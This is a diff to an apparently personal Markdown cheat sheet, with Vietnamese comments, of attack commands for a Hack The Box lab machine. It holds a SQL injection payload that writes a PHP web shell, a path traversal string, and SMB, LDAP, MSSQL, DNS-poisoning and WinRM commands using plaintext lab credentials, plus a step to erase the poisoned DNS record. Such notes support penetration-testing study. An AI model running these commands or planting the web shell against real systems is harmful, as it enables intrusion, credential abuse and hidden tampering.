@@ -100,10 +100,53 @@ udugisan3rd' UNION ALL SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL
 ```
 ?page=../../../../../../../../windows/system32/drivers/etc/hosts
 ```
-### smbclient
-```
+## SMB - port 445
+``` 
 smbclient -N -L \\\\10.129.2.102\\
 smbclient -N \\\\10.129.2.102\\backups
+```
+### netexec
+```
+# Check quyền Administrator
+netexec smb 10.129.5.49 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --shares
+# dumb user/group
+netexec smb 10.129.5.49 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --user / group
+```
+## LDAP - port 389
+```
+# Tìm nhóm của target
+ldapsearch -x -H ldap://10.129.5.49 -D "overwatch\sqlsvc" -w 'TI0LKcfHzZw1Vv' -b "DC=overwatch,DC=htb" "(sAMAccountName=sqlmgmt)" memberOf
+```
+
+## MSSQL - port 1433
+```
+# Connect db
+impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.5.49 -windows-auth
+# Cú pháp kiểm tra Linked Servers
+SELECT name, provider, data_source FROM sys.servers;
+```
+```
+# Lệnh uỷ quyền
+SELECT * FROM OPENQUERY("SQL07", 'SELECT 1');
+```
+
+## DNS Poisening
+```
+# Thêm bản ghi
+python3 dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -r <TÊN_BẢN_GHI_MỤC_TIÊU> -a add -d <IP_KALI_CỦA_BẠN> <IP_DOMAIN_CONTROLLER>
+# Xoá vết (quan trọng)
+python3 dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07 -a remove <IP_DOMAIN_CONTROLLER>
+```
+
+## WinRM - 5985/5986
+```
+evil-winrm -i 10.129.5.49 -u sqlmgmt -p 'bIhBbzMMnB82yx'
+```
+
+## Kiểm tra port đang mở
+```
+# Tìm port 
+netstat -ano | findstr <PORT_MỤC_TIÊU>
 ```
 ## Docker esc
 ```
